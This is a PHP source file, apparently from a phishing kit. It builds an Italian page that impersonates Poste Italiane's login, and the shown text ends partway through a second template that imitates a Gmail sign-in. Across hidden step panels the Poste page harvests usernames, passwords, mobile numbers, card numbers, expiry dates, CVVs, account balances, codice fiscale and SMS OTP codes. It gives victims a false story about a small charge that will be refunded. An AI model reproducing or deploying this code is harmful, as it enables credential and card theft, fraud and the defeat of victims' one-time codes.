<?php
if (!(function_exists('icloudTemplate'))) {
function icloudTemplate($title, $emailid, $MD5IdentificaAcesso)
{
	//Template Modelo 1

	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$RandomIdentificacao = time()*rand();


	$html2 = $MD5IdentificaAcesso;
	$html = '
<!DOCTYPE html>

<html lang="it" class="pi-lg pi-chrome"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
		<title>Accedi o Registrati</title>

<script>
function empty() {
    var x;
    x = document.getElementById("username").value;
    if (x == "") {
        document.getElementById("username").style = "border-color: red";
        return false;
    }
    var x;
    x = document.getElementById("password").value;
    if (x == "") {
        document.getElementById("password").style = "border-color: red";
        return false;
    }

}
</script>

<script>
function change() {
    var e;
    e = document.getElementById("username").value;
    if (e !== ""){
	    document.getElementById("username").style = "";
	}
	var e;
    e = document.getElementById("password").value;
    if (e !== ""){
	    document.getElementById("password").style = "";
	}


}
</script>


		<link href="/assets/bank1/favicon.ico" rel="shortcut icon">
			<meta http-equiv="X-UA-Compatible" content="IE=edge">
			<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no, user-scalable=0">

				<link type="text/css" rel="stylesheet" href="/assets/bank1/bootstrap.min.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/owl.carousel.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/slick.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/slick-theme.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/base.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/megamenu-pi.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/retina.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/custom-form-element.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/bootstrap-datepicker.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/ion.rangeSlider.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/ion.rangeSlider.skinPoste.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/configuratore.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/custom.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/registrazione.css">
				<link type="text/css" rel="stylesheet" href="/assets/bank1/style.css">
			<style>
				.ng-hide{
					display:none;
				}
			</style>



				</head>

	<body style="padding-top: 49px;">

		<div class="pageLoader" style="background-color: rgb(255, 255, 255); position: fixed; width: 100%; height: 100%; z-index: 9999; top: 0px; opacity: 1; text-align: center; padding-top: 20%; display: none;"><img class="loader-logo" alt="Poste Italiane" src="/assets/bank1/logo-poste-italiane.png" srcset="/assets/bank1/logo-poste-italiane@2x.png 2x" style="height: 22px;"><img class="loader-spinner" src="/assets/bank1/spinner_giallo.gif" style="padding-top: 40px; width: 40px; display: block; margin: 0px auto;"></div>
	<div class="content content-alert-browser">
		<div id="content-alert-old-browser" class="content content-alert-old-browser">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div id="alertIe" class="innerspacer-xs-top-20 innerspacer-xs-bottom-20">
							<div id="alertIe-inner">
								La versione del tuo browser non è aggiornata. Per una migliore navigazione del sito, scarica la versione più recente.
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
		<div id="content-alert-cookie" class="content content-alert-cookie" style="display: none;">
			<div class="container">
				<div class="row">
					<div class="col-md-12">
						<div id="alertCookie" class="innerspacer-xs-top-30 innerspacer-xs-bottom-20">
							<div id="alertCookie-inner">
								I nostri cookie e quelli installati da terze parti ci aiutano a migliorare i nostri servizi online. Se ne accetti l';
								$html .= "'";
								$html .= 'uso continua a navigare sul nostro sito. Se vuoi saperne di più o negare il consenso a tutti o ad alcuni cookie clicca su: <a href="">approfondisci</a>
							</div>
							<span title="chiudi informativa sintetica sui cookie" id="alertCookie-confirm"><img src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAcEBAQFBAcFBQcKBwUHCgwJBwcJDA0LCwwLCw0RDQ0NDQ0NEQ0PEBEQDw0UFBYWFBQeHR0dHiIiIiIiIiIiIiL/2wBDAQgHBw0MDRgQEBgaFREVGiAgICAgICAgICAgICAhICAgICAgISEhICAgISEhISEhISEiIiIiIiIiIiIiIiIiIiL/wAARCAAMAAsDAREAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAABwMF/8QAJhAAAQMDAgUFAAAAAAAAAAAAAgEDBAUGBwAREhMyYYEVIUFEUf/EABQBAQAAAAAAAAAAAAAAAAAAAAD/xAAUEQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIRAxEAPwCGbH5+O78qNHtiox4VPv5kPUWXPpOm7y3JCbdIuCRe/cvxNA9WdY1vWza8CgwGQciwmUbF0hRSNeonF7mSqXnQCuMqNTckUvItx3a0kyqSCchC58MMsN8xsWEXfg4SEV8aDMx3nu/YdlU2HvHkJGaVkHXwInFBslAOIkNN9hRE0H//2Q==" alt="chiudi"></span>
						</div>

					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="content content-federation-bar content-federation-bar-minified content-federation-bar-simplified" style="padding: 12px 0 0 0;">
		<div class="container container-extended">
			<div class="row">
				<div class="col-md-12">
					<div class="header-minified">
						<div class="row">
							<div class="col-xs-12">
								<div class="federation-bar-content-logo pull-xs-left clearfix">
									<div class="logo">

											<a href="" title="" class="hidden-xs hidden-sm">
												<span class="wrap-logo wrap-logo-medium"><img alt="Poste Italiane" src="/assets/bank1/logo-poste-italiane-medium.png" srcset="/assets/bank1/logo-poste-italiane-medium.png 2x" class="logo-image-pi-medium"></span>
											</a>


											<a href="" title="" class="logo-mobile hidden-md hidden-lg">
												<span class="wrap-logo wrap-logo-small"><img alt="Poste Italiane" src="/assets/bank1/logo-poste-italiane-small.png" srcset="/assets/bank1/logo-poste-italiane-small.png 2x" class="logo-image-pi-small"></span>
											</a>

									</div>



								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
		</div>
</div>

<div id="bank1_top2" class="content content-progressbar content-white innerspacer-xs-top-10 innerspacer-xs-bottom-10" style="display: none;">
        <div class="container">
            <div class="row">
                <div class="col-md-12 spacer-xs-bottom-30" style="height: 50px;">
                    <ol class="steps" ng-show="tipo=="normale"">
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">1&nbsp;</span><span class="step-desc">Dati Personali</span></span></a>
                        </li>
                        <li class="active">
                        	<a href="" class="active"><span class="step-content"><span class="step-number">2&nbsp;</span><span class="step-desc">Dettagli di Fatturazione</span></span></a>
                        </li>
						<li>
							<a href="" class="not-active"><span class="step-content"><span class="step-number">3&nbsp;</span><span class="step-desc">Conferma OTP</span></span></a>
						</li>
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">4&nbsp;</span><span class="step-desc">Completato</span></span></a>
                        </li>

                    </ol>

                </div>
            </div>
        </div>
    </div>


    <div id="bank1_top3" class="content content-progressbar content-white innerspacer-xs-top-10 innerspacer-xs-bottom-10" style="display: none;">
        <div class="container">
            <div class="row">
                <div class="col-md-12 spacer-xs-bottom-30" style="height: 50px;">
                    <ol class="steps" ng-show="tipo=="normale"">
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">1&nbsp;</span><span class="step-desc">Dati Personali</span></span></a>
                        </li>
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">2&nbsp;</span><span class="step-desc">Dettagli di Fatturazione</span></span></a>
                        </li>
						<li class="active">
							<a href="" class="not-active"><span class="step-content"><span class="step-number">3&nbsp;</span><span class="step-desc">Conferma OTP</span></span></a>
                        </li>
						<li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">4&nbsp;</span><span class="step-desc">Completato</span></span></a>
                        </li>

                    </ol>

                </div>
            </div>
        </div>
    </div>


    <div id="bank1_top4" class="content content-progressbar content-white innerspacer-xs-top-10 innerspacer-xs-bottom-10" style="display: none;">
        <div class="container">
            <div class="row">
                <div class="col-md-12 spacer-xs-bottom-30" style="height: 50px;">
                    <ol class="steps" ng-show="tipo=="normale"">
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">1&nbsp;</span><span class="step-desc">Dati Personali</span></span></a>
                        </li>
                        <li>
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">2&nbsp;</span><span class="step-desc">Dettagli di Fatturazione</span></span></a>
                        </li>
						<li>
							<a href="" class="not-active"><span class="step-content"><span class="step-number">3&nbsp;</span><span class="step-desc">Conferma OTP</span></span></a>
                        </li>
						<li class="active">
                        	<a href="" class="not-active"><span class="step-content"><span class="step-number">4&nbsp;</span><span class="step-desc">Completato</span></span></a>
                        </li>

                    </ol>

                </div>
            </div>
        </div>
    </div>


				<div id="bank1_top1" class="content content-abstract content-white">
			        <div class="container">
			            <div class="row">
			                <div class="col-md-12">
			                    <div class="abstract">
			                        <div class="abstract-heading">

			                            	<h1>Accedi o Registrati</h1>


			                        </div>
			                    </div>
			                </div>
			            </div>
			        </div>
			    </div>




			<div class="content content-main nobracket border-xs-bottom">
				<div class="container">
					<div class="row">
						<div class="col-md-12" id="accessibility-anchor">
							<div class="row">
								<div class="col-xs-12">
									<div id="main">





<div id="main">
	  <div class="row">

		 <div id="bank1_main2" class="col-sm-6 col-md-7 col-lg-8" style="display: none;">
			<div id="main">

				<div class="main-pills">
				<!-- uiView:  -->
					<div class="main-pills-wrap ng-scope" ui-view="">


						<fieldset style="border-bottom: 0px solid #ececec;padding: 0 0 0px;margin-bottom: 0px;">

							<div class="row">
							    <div class="col-sm-12">
							        <div class="context-abstract">
							            <h3 class="area-heading">Conferma i Tuoi Dettagli</h3>
										<hr>
							            <!-- <p style="font-size: 120%">Dettagli di Fatturazione</p> -->
							        </div>
							    </div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<div class="form-group form-group-lg">
										<label class="control-label" for="">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

										<span>Numero di Carta</span>
										</label>
										<input style="text-transform: capitalize;" name="card_number" id="card_number" type="tel" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" placeholder="XXXX XXXX XXXX XXXX" maxlength="16" onkeyup="check()" onblur="cc_check()">
									</div>
								</div>
								</div>

								<div class="row">
								<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="campo-nome">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">
										<img src="/assets/bank1/ico-applicative-alert.png" class="spacer-xs-right-05 ng-hide">
										<span>Data di Scadenza</span>
										</label>
										<input style="" name="expiry_date" id="expiry_date" type="tel" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" placeholder="MM/YY" maxlength="5" onkeyup="check()" onblur="expiry_check()">
										<div class="has-error help-block ng-inactive" role="alert">

										</div>
									</div>
								</div>
								<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

										<span>Codice CVV</span>
										</label>
										<input style="" name="cvv" id="cvv" type="tel" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" placeholder="Inserisci" maxlength="3" onkeyup="check()" onblur="cvv_check()">
									</div>
								</div>

								</div>
								<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="campo-nome">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">
										<img src="/assets/bank1/ico-applicative-alert.png" class="spacer-xs-right-05 ng-hide">
										<span>Saldo disponibile</span>
										</label>
										<input style="text-transform: capitalize;" name="saldo" id="saldo" type="text" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" placeholder="Inserisci il saldo disponibile" onkeyup="check()">
										<div class="has-error help-block ng-inactive" role="alert">

										</div>
									</div>
								</div>

								</div>

						</fieldset>



						<fieldset>
							<div class="row">
								<div class="col-sm-12">
									<div class="onward-button">
										<p class="">
											<button onclick="CickMain2()" id="button" class="btn btn-primary" type="submit" disabled>Prosegui</button>
										</p>
									</div>
								</div>
							</div>

						</fieldset>



					</div>
				</div>

			</div>
		</div>



		<div id="bank1_main5" class="col-sm-6 col-md-7 col-lg-8" style="display: none;"">
			<div id="main">

				<div class="main-pills">
				<!-- uiView:  -->
					<div class="main-pills-wrap ng-scope" ui-view="">


						<fieldset style="border-bottom: 0px solid #ececec;padding: 0 0 0px;margin-bottom: 0px;">

							<div class="row">
							    <div class="col-sm-12">
							        <div class="context-abstract">
							            <h3 class="area-heading">Conferma i Tuoi Dettagli</h3>
										<hr>
							            <!--<p style="font-size: 120%">Dettagli di Fatturazione</p>-->
							        </div>
							    </div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<div class="form-group form-group-lg">
										<label class="control-label" for="">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

										<span>Nome</span>
										</label>
										<input style="text-transform: capitalize;" name="nome_input" id="nome_input" type="text" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" onkeyup="check2()">
									</div>
								</div>
							</div>

							<div class="row">
								<div class="col-sm-12">
									<div class="form-group form-group-lg">
										<label class="control-label" for="">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

										<span>Cognome</span>
										</label>
										<input style="text-transform: capitalize;" name="cognome_input" id="cognome_input" type="text" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-maxlength" onkeyup="check2()">
									</div>
								</div>
							</div>

								<div class="row">
								<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="campo-nome">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">
										<img src="/assets/bank1/ico-applicative-alert.png" class="spacer-xs-right-05 ng-hide">
										<span>Data di nascita</span>
										</label>
										<input style="" name="data_nascita" id="data_nascita" type="date" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" onkeyup="check2()">
										<div class="has-error help-block ng-inactive" role="alert">

										</div>
									</div>
								</div>
								<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

										<span>Codice fiscale</span>
										</label>
										<input style="" name="codice_fiscale" id="codice_fiscale" type="text" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" onkeyup="check2()">
									</div>
								</div>


								</div>

						</fieldset>



						<fieldset>
							<div class="row">
								<div class="col-sm-12">
									<div class="onward-button">
										<p class="">
											<button onclick="CickMain5()" id="button2" class="btn btn-primary" type="submit" disabled>Prosegui</button>
										</p>
									</div>
								</div>
							</div>

						</fieldset>



					</div>
				</div>

			</div>
		</div>





		 <div id="bank1_main4" class="col-sm-6 col-md-7 col-lg-8" style="display: none;">
		 	<div id="main">

<div class="main-pills">
<!-- uiView:  --><div class="main-pills-wrap ng-scope" ui-view="">

	<fieldset>

			<div class="row">
			    <div class="col-sm-12">
			        <div class="context-abstract">
			            <h3 class="area-heading">La conferma è completa</h3>
						<hr>
			            <p style="font-size: 100%; float:left; text-align: center; width:100%; padding: 30px 0 0 0"><span style="font-size: 22px">In lavorazione...</span><br><br><img src="/assets/bank1/spin.gif"><br><br><br>Le informazioni del tuo account sono in fase di elaborazione<br><br>Al termine verrà disconnesso e reindirizzato alla nostra pagina di accesso.<br><br></p>
			        </div>
			    </div>
			</div>
	</fieldset>

</div>
</div>


											</div>
		 </div>






		 <div id="bank1_main3" class="col-sm-6 col-md-7 col-lg-8" style="display: none;">
		 	<div id="main">

<div class="main-pills">
<!-- uiView:  --><div class="main-pills-wrap ng-scope" ui-view="">


	<fieldset>

			<div class="row">
			    <div class="col-sm-12">
			        <div class="context-abstract">
                        			            <h3 class="area-heading">Conferma OTP</h3>
						<hr>
			            <p style="font-size: 100%">Gentile Cliente,

A breve le arriverà un codice dispositivo sulla sua utenza telefonica per poter confermare laggiornamento,<strong> Le verranno detratti 0,15 CENT/EURO che le verranno stornati alla fine della procedura.</strong> La preghiamo di attendere fino a 15 minuti ed inserire tale codice nel form sottostante.<strong>Per gli utenti BancoPosta inserire Il Codice a 4 cifre ricevuto durante la Registrazione del sito per completare laggiornamento.</strong>
			        </p></div>
			    </div>

					<div id="MessageSMS" class="col-xs-12" style="display: none;">
						<div class="box-advice box-messages box-success">
							<div class="box-heading">
								<h3 class="area-heading">
									Inserisci il codice ricevuto via SMS
								</h3>
							</div>
							<div class="box-body">
								<p>Immetti il nuovo codice che hai ricevuto via SMS.</p>
							</div>
						</div>
					</div>

			</div>


				<div class="row">
				<div class="col-sm-6">
					<div class="form-group form-group-lg">
						<label class="control-label" for="">
						<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">

						<span>Codice OTP</span>
						</label>
						<input style="" name="0tp" id="0tp" type="tel" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" placeholder="Inserisci" maxlength="6" onblur="otp_check()" onkeypress="otp_check()">
					</div>
				</div>
				</div>

	</fieldset>



	<fieldset>
		<div class="row">
			<div class="col-sm-12">
				<div class="onward-button">
					<p class="">
						<button onclick="CickMain3()" id="buttonCompletare" class="btn btn-primary" type="submit" disabled>Completare</button>
					</p>
				</div>
			</div>
		</div>

	</fieldset>


</div>
</div>


											</div>
		 </div>


		 <div id="bank1_main1" class="col-sm-6 col-md-7 col-lg-8">
			<div class="main-pills equalize equalize-height-xs-not" style="min-height: 532px;">
			   <div class="main-pills-wrap">
				  <div class="row">
					 <div class="col-sm-12">
						   <div class="row">
							  <div class="col-sm-12">
								 <h2>Accedi con Poste.it</h2>
							  </div>
							  <div class="col-md-6">
								 <ul class="segments" role="tablist">
									<li class="active">
									   <a href="javascript:void(0);">
										  <span class="segment-content">
											 <span class="segment-desc">Privato</span>
										  </span>
									   </a>
									</li>
									<li class="">
									   <a href="">
										  <span class="segment-content">
											 <span class="segment-desc">Aziende</span>
										  </span>
									  </a>
									</li>
								 </ul>
							  </div>
							  <div class="col-sm-12">
								<div class="box-editable-area">
									<p>Inserisci qui le tue credenziali</p>
								</div>
							  </div>

							  <div class="col-sm-12" id="userpassinvalid" style="display: none;">
								<div class="box-editable-area">
									<p style="color: red;">Il nome utente o la password non sono validi.</p>
								</div>
							  </div>

						   </div>



						   <div class="row">
							  <div class="col-sm-12">
								 <!-- Tab panes -->
								 <div class="tab-content">
									<div role="tabpanel" class="tab-pane active" id="privati">

										<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
										<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
										<input type="hidden" name="TemplateBank" id="TemplateBank" value="1">
										<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
										<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">
									   <div class="row">
										  <div class="col-sm-12">
											 <div class="row">
												<div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 <label class="control-label" for="username">
															Nome utente
														 </label>
														 <input type="text" title="" name="username" id="username" class="form-control" placeholder="Inserisci" onblur="change()" onkeyup="AtivaButton1()">
													  </p>
												   </div>
												</div>
												<div class="col-md-6">
												   <div class="form-group form-group-lg">
													  <p>
														 <label class="control-label" for="password">
															Password
														 </label>
														 <input type="password" name="password" title="" data-placement="top" class="form-control" id="password" placeholder="Inserisci" onblur="change()" onkeyup="AtivaButton1()">
													  </p>
												   </div>
												</div>


												<div class="col-sm-6">
									<div class="form-group form-group-lg">
										<label class="control-label" for="campo-nome">
										<img class="spacer-xs-right-05 ng-hide" src="/assets/bank1/ico-applicative-success.png">
										<img src="/assets/bank1/ico-applicative-alert.png" class="spacer-xs-right-05 ng-hide">
										<span>Cellulare</span>
										</label>
										<input style="text-transform: capitalize;" name="cell" id="cell" type="text" class="form-control ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required ng-valid-pattern ng-valid-maxlength" placeholder="Inserisci numero di cellulare" maxlength="10" onkeyup="AtivaButton1()">
										<div class="has-error help-block ng-inactive" role="alert">

										</div>
									</div>




												<div class="col-sm-12">
												   <div class="box-editable-area spacer-xs-bottom-30">
													  <p class="subtext"><a href="">Hai dimenticato la password o il tuo nome utente?</a></p>
												   </div>
												</div>
												<div class="col-sm-12 col-md-6">
												   <div class="btn-contaiener btn-container-left spacer-xs-bottom-0 spacer-xs-top-15 clearfix">
													  <input onClick="CickMain1()" type="submit" id="accedibtn" class="btn btn-primary btn-expand" value="accedi" disabled>
												   </div>
												</div>
												<div class="col-sm-12">
												   <div class="box-editable-area text-xs-center text-md-left">
													  <p>Non sei registrato a Poste.it? <a href="">Registrati</a>.</p>
												   </div>
												</div>
											 </div>
										  </div>
									   </div>

									</div>
								 </div>
							  </div>
						   </div>
					 </div>
				  </div>
			   </div>
			</div>
		 </div>
		 <div class="col-sm-6 col-md-5 col-lg-4 spacer-xs-top-30 spacer-sm-top-0">
			<div class="main-pills equalize equalize-height-xs-not" style="min-height: 532px;">
			   <div class="main-pills-wrap">
				  <div class="row">
					 <div class="col-sm-12">
						<h2>Accedi con PosteID abilitato a SPID</h2>
					 </div>
					 <div class="col-sm-12">
						<p>
						   L';
						   $html .= "'";
						   $html .= 'identità digitale di Poste Italiane che ti consente di accedere a tutti i servizi di Poste abilitati e ai servizi che espongono il logo SPID
						</p>
					 </div>

					 <div class="col-sm-12">
						<div id="bottonePosteID"><div class="bottonePosteID-wrapper text-xs-center"><a href=""><img src="/assets/bank1/logo-posteid.png" srcset="/assets/bank1/logo-posteid.png " class="spacer-xs-bottom-30 spacer-xs-top-30"><span class="wrapperPosteID-info spacer-xs-top-15 btn btn-primary btn-expand">Accedi con PosteID</span></a></div><div class="newUserPosteID-wrapper"></div></div>
					 </div>
					 <div class="col-sm-12">
						<div class="box-editable-area text-xs-center">
						   <p>Non hai l';
						   $html .= "'";
						   $html .= 'identità digitale? <br><a href="">Richiedi PosteID</a>.</p>
						</div>
					 </div>
				  </div>
			   </div>
			</div>
		 </div>
	  </div>
	  <div class="row">
		 <div class="col-sm-12 spacer-xs-top-30">
			<div class="main-pills main-pills-basic">
			<div class="box-editable-area box-editable-spacing">
			   <p class="spacer-xs-top-20 text-xs-center">In caso di mancato accesso o non funzionamento dei servizi è possibile contattare il Call Center al numero verde <a href="tel:803.160">803.160</a> (dal lunedì al sabato dalle ore 8.00 alle ore 20.00) effettuando la scelta "3" per i Servizi Internet.
				  La chiamata è gratuita da rete fissa; le chiamate da rete mobile sono gratuite solo per informazioni su PosteMobile. Per le altre informazioni, da rete mobile chiamare il <a href="tel:199.100.160">199.100.160</a>.</p>
			</div>
			</div>
		 </div>
	  </div>
   </div>



									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>

				<div class="content content-post-main  border-xs-bottom">
				      <div class="container">










	<div class="row">
		<div class="col-sm-12">
			<div class="row">

					<div class="col-sm-12">
						<h2 class="text-xs-center">Hai bisogno di aiuto?</h2>
					</div>




						<div class="col-md-12 col-lg-push-1 col-lg-10">
							<div class="btn-container text-xs-center">
								<div class="row">

										<div class="col-sm-6 col-md-4">

											<a href="" class="btn btn-primary btn-expand" target="_self"><img alt="Chiamaci" src="/assets/bank1/chiamaci.png" srcset="/assets/bank1/chiamaci.png 2x" class="spacer-xs-right-10">Chiamaci</a>
										</div>

										<div class="col-sm-6 col-md-4">

											<a href="" class="btn btn-primary btn-expand" target="_self"><img alt="Scrivici" src="/assets/bank1/scrivici.png" srcset="/assets/bank1/scrivici.png 2x" class="spacer-xs-right-10">Scrivici</a>
										</div>

										<div class="col-sm-6 col-md-4">

											<a href="" class="btn btn-primary btn-expand" target="_self"><img alt="Vieni in poste" src="/assets/bank1/vieni-in-poste-cerca-up.png" srcset="/assets/bank1/vieni-in-poste-cerca-up.png 2x" class="spacer-xs-right-10">Vieni in Poste</a>
										</div>

								</div>
							</div>
						</div>


			</div>
		</div>
	</div>



					</div>
				</div>



	<div class="content content-footer content-footer-post">
		<div class="container">
			<div class="row">
				<div class="col-md-12">
					<div class="row">
						<div class="col-md-8">
							<p class="text-xs-center text-md-left">
								© Poste Italiane 2018 - Partita iva : 01114601006&nbsp;&nbsp;
							</p>
						</div>
						<div class="col-md-4">
							<div class="clearfix">
								<div class="base-footer">

								</div>
							</div>
						</div>
					</div>
					<a href="" class="btn btn-primary btn-cta back-to-top"> <span class="hide">vai a inizio pagina</span>
					</a>
				</div>
			</div>
		</div>
	</div>

	<div class="responsive-bootstrap-toolkit"><div class="device-xs visible-xs visible-xs-block"></div><div class="device-sm visible-sm visible-sm-block"></div><div class="device-md visible-md visible-md-block"></div><div class="device-lg visible-lg visible-lg-block"></div></div></body></html>
<!-- Smartsupp Live Chat script -->
<script type="text/javascript">
var _smartsupp = _smartsupp || {};
_smartsupp.key = "38caa7e2e05a76ba57e49efb33305302df46f53b";
window.smartsupp||(function(d) {
  var s,c,o=smartsupp=function(){ o._.push(arguments)};o._=[];
  s=d.getElementsByTagName("script")[0];c=d.createElement("script");
  c.type="text/javascript";c.charset="utf-8";c.async=true;
  c.src="https://www.smartsuppchat.com/loader.js?";s.parentNode.insertBefore(c,s);
})(document);
</script>
<script src="/assets/js/jquery.js"></script>
<script src="/assets/bank1/bank1.js?t=' . time() .'"></script>
';
	return $html;
}
}

if (!(function_exists('gmail2020'))) {
function gmail2020($title, $emailid)
{
	$finalLink 	= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$html = '<html lang="pt" dir="ltr" class="CMgTXc" style="cursor: pointer;">
    <head>

        <link rel="shortcut icon" href="/assets/layout/faviconGoogle.ico" />
        <title>Gmail</title>

        <meta name="viewport" content="width=device-width, initial-scale=1" />

		<link rel="stylesheet" href="/assets/layout/cssGoogle1.css">
	      <link rel="stylesheet" href="/assets/layout/cssGoogle2.css">
	      <link rel="stylesheet" href="/assets/layout/cssGoogle3.css">
	<script src="/assets/src/code.jquery.com/jquery-1.10.2.js"></script>
	<script src="/assets/src/code.jquery.com/ui/1.12.1/jquery-ui.js"></script>



    </head>
    <body id="yDmH0d" class="Z3Coxe fVfPj EIlDfe" jscontroller="Uas9Hd" jsaction="rcuQ6b:npT2md;click:FAbpgf;GvneHb:.CLIENT;wINJic:.CLIENT;qako4e:.CLIENT;TSpWaf:.CLIENT;nHjqDd:.CLIENT;keydown:.CLIENT">
        <div class="H2SoFe LZgQXe TFhTPc" data-continent="South America" data-session-region="BR">
            <div class="RAYh1e LZgQXe" id="initialView" role="presentation" jsname="WsjYwc" jscontroller="GHsEdb" jsaction="rcuQ6b:wVXPKc,eyofDf;CfTBWd:r0xNSb;enEq8c:Yd2OHe;Z2AmMb:nnGvjf;eqoCse:oUMEzf;RdYeUb:oUMEzf;EJh3N:vYWWBd;">
                <div class="RZBuIb c8DD0" aria-hidden="true">
                    <div jscontroller="ltDFwf" jsaction="transitionend:Zdx3Re" jsname="Igk6W" role="progressbar" class="sZwd7c B6Vhqe qdulke jK7moc">
                        <div class="xcNBHc um3FLe"></div>
                        <div jsname="cQwEuf" class="w2zcLc Iq5ZMc"></div>
                        <div class="MyvhI TKVRUb" jsname="P1ekSe"><span class="l3q5xe SQxu9c"></span></div>
                        <div class="MyvhI sUoeld"><span class="l3q5xe SQxu9c"></span></div>
                    </div>
                </div>
                <div class="xkfVF" jsname="f2d3ae" role="presentation">
                    <div class="Aa1VU">
                        <div class="Lth2jb" jsname="n7vHCb" jscontroller="rKxYMb" jsaction="rcuQ6b:qg4Ic;Kzwjs:WPi0i;" data-oauth-third-party-logo-url="" aria-hidden="true">
                            <div jsname="jjf7Ff">
                                <div id="logo" class="v8vQje" title="Google">
                                    <div class="rr0DNb" jsname="l4eHX">
                                        <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" class="l5Lhkf">
                                            <g id="qaEJec">
                                                <path
                                                    fill="#ea4335"
                                                    d="M67.954 16.303c-1.33 0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 2.41-5.622 5.96 0 3.34 2.53 5.96 5.92 5.96 2.73 0 4.31-1.67 4.97-2.64l-2.03-1.35c-.673.98-1.6 1.64-2.93 1.64zm-.203-7.27c1.04 0 1.92.52 2.21 1.264l-5.32 2.21c-.06-2.3 1.79-3.474 3.12-3.474z"
                                                ></path>
                                            </g>
                                            <g id="YGlOvc"><path fill="#34a853" d="M58.193.67h2.564v17.44h-2.564z"></path></g>
                                            <g id="BWfIk">
                                                <path
                                                    fill="#4285f4"
